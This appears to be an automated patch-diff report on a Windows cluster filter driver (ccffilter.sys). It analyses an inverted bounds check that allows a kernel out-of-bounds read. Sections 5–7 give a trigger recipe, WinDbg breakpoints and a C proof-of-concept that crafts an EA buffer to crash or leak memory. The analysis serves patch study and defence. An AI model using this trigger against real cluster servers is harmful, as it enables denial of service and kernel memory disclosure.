Title: ccffilter.sys — Out-of-bounds read due to inverted bounds check (CWE-125, CWE-697) in CCFFilterAppInstanceEA fixed
Date: 2026-06-25
Slug: ccffilter_aec44ab5-ccffilter-report-20260625-204530
Category: Corpus
Author: Argus
Summary: KB5073723
Severity: High

---

## 1. Overview

| Field | Value |
|---|---|
| Unpatched binary | `ccffilter_unpatched.sys` |
| Patched binary | `ccffilter_patched.sys` |
| Overall similarity | **0.9931** |
| Matched functions | 85 |
| Changed functions | **1** |
| Identical functions | 84 |
| Unmatched (either direction) | 0 |

**Verdict:** A single-byte patch in `CCFFilterAppInstanceEA` flips an inverted bounds check (`jb` → `ja`) at `0x1c00099f7`. The unpatched driver mis-validates the `EaValueLength` field of a `FILE_FULL_EA_INFORMATION` entry named `ClusteredApplicationInstance`, enabling an out-of-bounds read of up to 20 bytes from kernel pool memory on any `NtCreateFile` issued against a Cluster Shared Volume.

---

## 2. Vulnerability Summary

### Finding #1 — Inverted bounds check → kernel OOB read

- **Severity:** High
- **Class:** Out-of-bounds read due to incorrect comparison (CWE-125 / CWE-697)
- **Affected function:** `ccffilter_unpatched!CCFFilterAppInstanceEA` @ `0x1c000990c`
- **Patched instruction:** `0x1c00099f7` — opcode `0F 82` (`jb`) → `0F 87` (`ja`)

**Root cause.** The minifilter walks the EA chain supplied with an `IRP_MJ_CREATE` looking for an EA named `ClusteredApplicationInstance`. When found, it expects the EA's value to be either a 16-byte GUID (`EaValueLength == 0x10`) or a 20-byte GUID+version structure (`EaValueLength >= 0x14`). For the 20-byte case, the function loads `eax = 0x14`, compares it against `EaValueLength` (in `dx`), and is *supposed* to bail out to an error path (`STATUS 0xC0000053`) whenever `EaValueLength < 0x14`. Instead, the branch is `jb` ("jump if 0x14 below EaValueLength"), which only sends values *greater than* `0x14` to the error path. Every value from `0x00–0x0F` and `0x11–0x13` falls through to two unconditional reads — a 16-byte `movups` and a 4-byte `mov dword` — that pull 20 bytes from a buffer the attacker sized arbitrarily small. The patch replaces `jb` with `ja`, restoring the intended semantics.

**Attacker-reachable entry point & call chain.**

1. Attacker (any user with permission to open a path on a CSV-managed volume) calls `NtCreateFile` / `CreateFileW` with an `EaBuffer` containing a crafted EA.
2. The I/O Manager builds an `IRP_MJ_CREATE` and routes it down the filter stack.
3. FltMgr dispatches the IRP to `CCFPreCreate` (Pre-op callback for `IRP_MJ_CREATE`) @ `0x1c00078c5`.
4. `CCFPreCreate` calls `CCFFilterAppInstanceEA(&EaBuffer, &EaLength, …, &GuidOut, &VersionOut, …)`.
5. `CCFFilterAppInstanceEA` walks the EA list, matches `ClusteredApplicationInstance` via `strncmp`, and executes the buggy check at `0x1c00099f7`.
6. The 20-byte OOB read writes 16 bytes into the output GUID (`r14`) and 4 bytes into a version output. Back in `CCFPreCreate`, the 16 leaked GUID bytes are copied into a `GUID_ECP_NETWORK_APP_INSTANCE` extra create parameter — allocated by `FltAllocateExtraCreateParameter` at `0x1c0007ac2`, filled at `0x1c0007b90` (`movdqu [ecp+4], xmm0` from the GUID buffer), and attached to the create via `CCFAddEcpToCreate` at `0x1c0007baa`.

---

## 3. Pseudocode Diff

```c
// After strncmp matched EA name "ClusteredApplicationInstance":
uint16_t ea_value_len = ea->EaValueLength;   // from [rbx+6]

if (ea_value_len == 0x10) {                  // 16-byte GUID-only format — correct
    memcpy(guid_out, &ea->EaName[ea->EaNameLength + 1], 16);
    *version_out = 0;
    goto done;
}

// ---- UNPATCHED (buggy) ----
if (0x14 < ea_value_len) {                   // BUG: rejects only len > 0x14
    goto err_status_c0000053;                 //      -> values < 0x14 fall through!
}
// 20-byte read path reached with len < 0x14 -> OOB read of up to 20 bytes
memcpy(guid_out,    &ea->EaName[ea->EaNameLength + 1],   16); // OOB
*version_out = *(uint32_t *)&ea->EaName[ea->EaNameLength + 17]; // OOB
goto done;

// ---- PATCHED (correct) ----
if (0x14 > ea_value_len) {                   // FIX: rejects len < 0x14
    goto err_status_c0000053;
}
memcpy(guid_out,    &ea->EaName[ea->EaNameLength + 1],   16); // safe
*version_out = *(uint32_t *)&ea->EaName[ea->EaNameLength + 17]; // safe
```

> The semantics flip is the entire bug. `0x14 < ea_value_len` (unpatched) accepts the dangerous range `0 ≤ len ≤ 0x14`; `0x14 > ea_value_len` (patched) correctly rejects it.

---

## 4. Assembly Analysis

### Vulnerable function — `CCFFilterAppInstanceEA` (unpatched, full annotated listing)

```asm
; ===== Prologue =====
0x1c000990c: mov     rax, rsp
0x1c000990f: mov     qword [rax+0x8],  rbx
0x1c0009913: mov     qword [rax+0x10], rbp
0x1c0009917: mov     qword [rax+0x18], rsi
0x1c000991b: mov     qword [rax+0x20], rdi
0x1c000991f: push    r12
0x1c0009921: push    r14
0x1c0009923: push    r15
0x1c0009925: sub     rsp, 0x30
0x1c0009929: mov     rbx, qword [rcx]      ; rbx = *arg1 = first FILE_FULL_EA_INFORMATION*
0x1c000992c: xor     edi, edi              ; rdi = 0 (status = STATUS_SUCCESS)
0x1c000992e: mov     r15d, edi
0x1c0009931: mov     ebp, edi
0x1c0009933: mov     sil, dil
0x1c0009936: mov     r14, r9               ; r14 = arg4 (output GUID buffer)
0x1c0009939: mov     r12, rdx              ; r12 = arg2 (EaLength pointer)

; ===== WPP tracing (skipped) =====
0x1c000993c: mov     rcx, qword [rel 0x1c0004088]
0x1c0009943: lea     rax, [rel 0x1c0004088]
0x1c000994a: cmp     rcx, rax
0x1c000994d: je      0x1c0009968

; ===== EA NAME COMPARISON LOOP =====
0x1c0009968: movzx   r8d, byte [rbx+0x5]             ; r8d = EaNameLength  <-- attacker-controlled
0x1c000996d: lea     rcx, [rbx+0x8]                  ; rcx = EaName
0x1c0009971: lea     rdx, [rel 0x1c00032a8]          ; rdx = "ClusteredApplicationInstance"
0x1c0009978: call    qword [rel 0x1c00060e0]         ; strncmp(EaName, "...", EaNameLength)
                                                     ; NOTE: EaNameLength=0 => trivial match
0x1c000997f: nop
0x1c0009984: test    eax, eax
0x1c0009986: je      0x1c000999c                     ; if match, process EA value

; no match -> walk NextEntryOffset
0x1c0009988: mov     eax, dword [rbx]
0x1c000998a: test    eax, eax
0x1c000998c: je      0x1c0009ad5                     ; end of list
0x1c0009992: add     ebp, eax
0x1c0009994: mov     r15, rbx
0x1c0009997: add     rbx, rax
0x1c000999a: jmp     0x1c0009968

; ===== EA VALUE SIZE CHECK =====
0x1c000999c: movzx   edx, word [rbx+0x6]             ; edx = EaValueLength (16-bit at +6)
0x1c00099a0: mov     eax, 0x10
0x1c00099a5: cmp     ax, dx
0x1c00099a8: jne     0x1c00099ef                     ; !=0x10 -> 20-byte check

; --- 16-byte GUID path (safe) ---
0x1c00099aa: movzx   eax, byte [rbx+0x5]
0x1c00099ae: movups  xmm0, xmmword [rax+rbx+0x9]
0x1c00099b3: movdqu  xmmword [r14], xmm0
; ... (set *arg5 = 0, WPP, jmp cleanup) ...

; ===== THE VULNERABLE CHECK =====
0x1c00099ef: mov     eax, 0x14                       ; eax = 20
0x1c00099f4: cmp     ax, dx                          ; 0x14 vs EaValueLength
0x1c00099f7: jb      0x1c0009aa0                     ; *** BUG: 0F 82 (jb) ***
;                                                     ;     UNPATCHED: error only if 0x14 < EaValueLength
;                                                     ;     PATCHED  : 0F 87 (ja) -> error if 0x14 > EaValueLength

; --- Fall-through: 20-byte read (VULNERABLE when EaValueLength < 0x14) ---
0x1c00099fd: movzx   eax, byte [rbx+0x5]             ; eax = EaNameLength
0x1c0009a01: movups  xmm0, xmmword [rax+rbx+0x9]     ; *** OOB READ #1: 16 bytes ***
0x1c0009a06: movdqu  xmmword [r14], xmm0             ;     -> stored to output GUID (arg4)
0x1c0009a0b: mov     edx, dword [rax+rbx+0x19]       ; *** OOB READ #2: 4 bytes at +0x10 ***
0x1c0009a0f: mov     rax, qword [rsp+0x70]           ; rax = arg5 (version out)
0x1c0009a14: mov     dword [rax], edx                ;     -> stored to output version
; ... (WPP, jmp cleanup) ...

; ===== Error path =====
0x1c0009aa0: mov     edi, 0xc0000053                 ; STATUS_INVALID_EA_NAME / EA error

; ===== Shared cleanup: zero-GUID check + compact EA list =====
0x1c0009a48: mov     rax, qword [r14]
0x1c0009a4b: sub     rax, qword [rel 0x1c0003320]
0x1c0009a52: jne     0x1c0009a5f
0x1c0009a54: mov     rax, qword [r14+0x8]
0x1c0009a58: sub     rax, qword [rel 0x1c0003328]
0x1c0009a5f: test    rax, rax
0x1c0009a62: mov     rax, qword [rsp+0x80]           ; arg7
0x1c0009a6a: setz    cl
0x1c0009a6d: mov     byte [rax], cl
0x1c0009a6f: mov     eax, dword [rbx]
0x1c0009a71: test    eax, eax
0x1c0009a73: jne     0x1c0009a86
0x1c0009a75: mov     dword [r12], ebp
0x1c0009a79: test    r15, r15
0x1c0009a7c: je      0x1c0009a81
0x1c0009a7e: mov     dword [r15], edi
0x1c0009a81: mov     sil, 0x1
0x1c0009a84: jmp     0x1c0009ad5
0x1c0009a86: sub     dword [r12], eax
0x1c0009a8a: mov     rcx, rbx
0x1c0009a8d: mov     r8d, dword [r12]
0x1c0009a91: mov     edx, dword [rbx]
0x1c0009a93: sub     r8d, ebp
0x1c0009a96: add     rdx, rbx
0x1c0009a99: call    memmove                         ; compact remaining EAs

; ===== Epilogue =====
0x1c0009ad5: mov     rcx, qword [rel 0x1c0004088]
; ... WPP ...
0x1c0009b17: mov     rcx, qword [rsp+0x78]           ; arg6
0x1c0009b1c: mov     eax, edi
0x1c0009b1e: mov     rbx, qword [rsp+0x50]
0x1c0009b23: mov     rbp, qword [rsp+0x58]
0x1c0009b28: mov     rdi, qword [rsp+0x68]
0x1c0009b2d: mov     byte [rcx], sil                 ; *arg6 = found flag
0x1c0009b30: mov     rsi, qword [rsp+0x60]
0x1c0009b35: add     rsp, 0x30
0x1c0009b39: pop     r15
0x1c0009b3b: pop     r14
0x1c0009b3d: pop     r12
0x1c0009b3f: retn
```

### Patch diff — the single-byte change

```diff
- 0x1c00099f7: 0F 82 A3 00 00 00    jb  0x1c0009aa0   ; only errors when EaValueLength > 0x14
+ 0x1c00099f7: 0F 87 A3 00 00 00    ja  0x1c0009aa0   ; correctly errors when EaValueLength < 0x14
```

That is the entire patch. Everything else — function layout, register usage, the OOB `movups`/`mov dword` reads — is byte-for-byte identical.

---

## 5. Trigger Conditions

1. **Reach the filter.** The target file must live on a volume managed by `ccffilter.sys` (Windows Server Failover Clustering / Cluster Shared Volumes). The driver must be loaded (`sc query ccffilter` / `lm ccffilter`).
2. **Issue a create with an EA buffer.** From user mode, call `NtCreateFile` (or `CreateFileW` with `FILE_FLAG_BACKUP_SEMANTICS`) targeting a path on the CSV volume. Provide the `EaBuffer` / `ExtendedAttributes` argument.
3. **Construct a malicious EA entry.** A single `FILE_FULL_EA_INFORMATION`:
   - `NextEntryOffset = 0`
   - `Flags = 0`
   - `EaNameLength = 0x1C` (length of `"ClusteredApplicationInstance"`)
   - **`EaValueLength`** ∈ {`0x00–0x0F`, `0x11–0x13`} — must **not** equal `0x10` and must be **less than** `0x14`. `0x01` is the easiest.
   - `EaName = "ClusteredApplicationInstance\0"`
   - `EaValue = <single byte>` (e.g. `0x41`)
4. **Size the buffer tight.** Total entry size with the values above = `8 + 29 + 1 = 38` bytes. Pass `EaLength = 38`. The tightest variant is the `strncmp` bypass: set `EaNameLength = 0`, `EaName = "\0"`, `EaValueLength = 1`, total = 10 bytes. The 20-byte read then extends 11+ bytes past the buffer.
5. **No race, no ordering constraint.** A single threaded `NtCreateFile` is sufficient.
6. **Confirmation.** Two observable outcomes:
   - **DoS:** BSOD with `PAGE_FAULT_IN_NONPAGED_AREA` / `BUGCODE` if the 20-byte read crosses into an unmapped page (highly likely when the EA buffer sits at the end of a pool page).
   - **Info leak:** Create proceeds and the 16 leaked GUID bytes are copied into a `GUID_ECP_NETWORK_APP_INSTANCE` extra create parameter (allocated by `FltAllocateExtraCreateParameter`, attached via `CCFAddEcpToCreate`) on the create IRP. The bytes cross a kernel trust boundary into an attacker-influenced create; whether an unprivileged caller can read the ECP contents back is not demonstrated here.

---

## 6. Exploit Primitive & Development Notes

### Primitive
- **Controlled OOB read** of up to 20 bytes from kernel pool, with attacker-chosen *distance* (via `EaNameLength` and `EaValueLength`) but not attacker-chosen *base* (whatever allocation the EA buffer happens to land adjacent to).
- **Info exposure:** the 16-byte OOB portion is copied into a `GUID_ECP_NETWORK_APP_INSTANCE` ECP attached to the create; the 4-byte version portion is written to a separate local output. This moves adjacent pool bytes across a kernel trust boundary, but attacker-side retrieval of the ECP is not demonstrated.
- **Reliable BSOD:** achievable by placing the EA buffer at the end of a page whose neighbor is unmapped so the 20-byte read faults.

### Notes
- **EaNameLength = 0 match:** the `strncmp(EaName, "ClusteredApplicationInstance", EaNameLength)` call returns 0 for `n = 0`, so the EA only needs the 8-byte header + 1 null + 1 value byte. This is the *minimum* entry and maximizes the OOB distance.
- **Read-only.** The bug reads out of bounds only; it is not a write primitive and does not itself yield code execution.

### Preconditions
- **CSV / Failover Clustering being enabled** is a precondition; on systems without the cluster role installed, `ccffilter.sys` is not loaded and the bug is unreachable.

---

## 7. Debugger PoC Playbook

Assume WinDbg/KD attached to a kernel running **`ccffilter_unpatched.sys`**, with symbols resolved (`.reload /f ccffilter.sys` then `lm ccffilter` to get the runtime base; add the base to each offset below).

### Breakpoints

```text
bp ccffilter_unpatched!CCFPreCreate+0x165         ; 0x1c00078c5 — call site into vulnerable func
bp ccffilter_unpatched!CCFFilterAppInstanceEA     ; 0x1c000990c — function entry
bp ccffilter_unpatched!CCFFilterAppInstanceEA+0xeb ; 0x1c00099f7 — the buggy jb/ja branch
bp ccffilter_unpatched!CCFFilterAppInstanceEA+0xf5 ; 0x1c0009a01 — first OOB movups read
```

### What to inspect

| Stop | Register / memory | Why |
|---|---|---|
| `0x1c00078c5` (`CCFPreCreate+0x165`) | `rcx` → `&Iopb->Parameters.Create.EaBuffer`; `rdx` → `&Iopb->Parameters.Create.EaLength` | Confirm attacker EA chain is wired through; `dq poi(rcx)` to dump the first EA entry. |
| `0x1c000990c` (entry) | `rcx` = arg1 → points to EA ptr (becomes `rbx`); `r9` = arg4 = output GUID; `[rsp+0x28]` = arg5 = output version | Identify output sinks; `db poi(rcx) L40` to see the crafted EA. |
| `0x1c00099f7` (the patch byte) | `ax` = `0x14`, `dx` = `EaValueLength` from `[rbx+6]` | Watch whether the branch is taken. Unpatched with `dx = 0x0001`: `0x14 < 0x0001` is **false**, so `jb` is **not taken** → bug fires. |
| `0x1c0009a01` (first OOB read) | `rax` = `EaNameLength` from `[rbx+5]`; `rbx` = current EA base | Effective address = `rbx + rax + 9`. Compare to the end of the pool allocation (`!pool rbx`) to confirm how far past the buffer the read goes. |
| Post-execution | `r14` (output GUID), `[rsp+0x70]` (output version ptr) | `db r14 L10` and `dd poi(rsp+70) L1` reveal the leaked bytes. |

### Key offsets (add module base)

| Offset | Instruction | Meaning |
|---|---|---|
| `+0xeb` (`0x1c00099f7`) | `0F 82 …` (unpatched) / `0F 87 …` (patched) | The patched byte. |
| `+0x90` (`0x1c000999c`) | `movzx edx, word [rbx+6]` | Loads `EaValueLength`. |
| `+0x9c` (`0x1c00099a8`) | `jne 0x1c00099ef` | Splits `0x10` (GUID-only) path from `0x14` path. |
| `+0xf5` (`0x1c0009a01`) | `movups xmm0, [rax+rbx+9]` | First OOB read (16 B). |
| `+0xff` (`0x1c0009a0b`) | `mov edx, [rax+rbx+0x19]` | Second OOB read (4 B). |
| `+0x194` (`0x1c0009aa0`) | `mov edi, 0xC0000053` | Error path (taken incorrectly in unpatched). |

### Trigger setup (from user mode)

```c
// Minimal PoC sketch ( SetLastError / NtCreateFile details omitted )
typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG  NextEntryOffset;
    UCHAR  Flags;
    UCHAR  EaNameLength;
    USHORT EaValueLength;
    CHAR   EaName[1];   // followed by EaValue
} FILE_FULL_EA_INFORMATION;

UCHAR buf[38] = { 0 };
FILE_FULL_EA_INFORMATION *ea = (FILE_FULL_EA_INFORMATION*)buf;
ea->NextEntryOffset  = 0;
ea->Flags            = 0;
ea->EaNameLength     = 0x1C;                      // "ClusteredApplicationInstance"
ea->EaValueLength    = 0x01;                      // *** triggers bug (1 < 0x14, != 0x10) ***
memcpy(ea->EaName,   "ClusteredApplicationInstance", 28);
ea->EaName[28]       = '\0';
ea->EaName[29]       = 0x41;                      // 1-byte EaValue

UNICODE_STRING     path  = RTL_CONSTANT_STRING(L"\\??\\C:\\ClusterStorage\\Volume1\\x");
OBJECT_ATTRIBUTES  oa; InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE, NULL, NULL);
IO_STATUS_BLOCK    iosb;
HANDLE             h;
NtCreateFile(&h, FILE_READ_DATA, &oa, &iosb, NULL, 0,
             FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_OPEN,
             0, buf, sizeof(buf));                // <-- EaBuffer + EaLength
```

For the maximum-OOB variant, set `EaNameLength = 0`, `EaName = "\0"`, `EaValueLength = 1`, total buffer = 10 bytes.

### Expected observation

- At `+0xeb` with crafted input: `dx = 0x0001`, `ax = 0x0014`. Single-step — `jb` is **not taken**. Execution proceeds to `+0xf5`.
- At `+0xf5`: `!pool rbx` shows the allocation; the effective address `rbx + rax + 9` lies *beyond* the allocation. `movups` reads 16 bytes, then `mov edx, [rax+rbx+0x19]` reads 4 more.
- If the read crosses into an unmapped page: **BSOD** with `PAGE_FAULT_IN_NONPAGED_AREA` (faulting address near `rbx + rax + 9`).
- If the read succeeds: the leaked bytes are observable at `r14` (GUID) and `[rsp+0x70]` (version), and propagate into the create IRP's ECP list.

### Struct / offset notes

`FILE_FULL_EA_INFORMATION` layout (offsets from EA entry base):

| Offset | Size | Field |
|---|---|---|
| `+0x00` | 4 | `NextEntryOffset` |
| `+0x04` | 1 | `Flags` |
| `+0x05` | 1 | `EaNameLength` |
| `+0x06` | 2 | `EaValueLength` |
| `+0x08` | var | `EaName` (NUL-terminated) |
| `+0x08 + EaNameLength + 1` | var | `EaValue` |

The vulnerable reads reference `[rbx + EaNameLength + 9]` (= start of `EaValue`) and `[rbx + EaNameLength + 0x19]` (= `EaValue + 0x10`).

---

## 8. Changed Functions — Full Triage

Only one function differs between the binaries; it is security-relevant.

| Function | Similarity | Change type | Note |
|---|---|---|---|
| `CCFFilterAppInstanceEA` | 0.9922 | Security-relevant (single-byte logic flip) | Bounds check at `+0xeb` reversed from `jb` to `ja`, fixing the inverted `EaValueLength` validation that allowed a 20-byte OOB read on `ClusteredApplicationInstance` EA values smaller than 0x14 bytes. |

No other functions changed. No cosmetic-only / register-allocation noise.

---

## 9. Unmatched Functions

None. `unmatched_unpatched = 0`, `unmatched_patched = 0`. No sanitizers were removed and no new mitigation helpers were added; the patch is purely the conditional-branch inversion inside `CCFFilterAppInstanceEA`.

---

## 10. Confidence & Caveats

- **Confidence: High.** The diff is a single byte (`0F 82` → `0F 87`), the semantic effect on the surrounding `cmp ax, dx` is unambiguous, and the OOB reads immediately downstream are confirmed by the assembly listing.
- **Assumptions:**
  - The `strncmp` import at `[rel 0x1c00060e0]` (resolved to `ntoskrnl!strncmp`) follows the C standard (`n = 0` returns 0).
  - The call chain `CCFPreCreate → CCFFilterAppInstanceEA` is a direct call at `0x1c00078c5`; the argument setup (`&EaBuffer` from `Iopb+0x38`, `&EaLength` from `Iopb+0x30`, `&GuidOut` = local, version/flag outputs) is visible at the call site.
  - Addresses are stated as static RVAs/offsets (e.g. `0x1c00099f7`); at runtime, ASLR rebases `ccffilter.sys`. Resolve the base first via `lm ccffilter`.
- **Manual verification before PoC:**
  1. Confirm `ccffilter.sys` is loaded and attached to a CSV volume on the target system.
  2. Disassemble `0x1c00099f7` to verify the opcode is `0F 82` (unpatched) vs `0F 87` (patched).
  3. Verify the EA-matching `strncmp` semantics with a `EaNameLength = 0` test case.
  4. Validate pool layout (`!pool`, `!poolused`) to predict whether the OOB read faults or discloses data.
  5. If pursuing the disclosure primitive, hook `FltAllocateExtraCreateParameter` (`0x1c0007ac2`) / `CCFAddEcpToCreate` (`0x1c0007baa`) to capture the leaked bytes from the ECP.
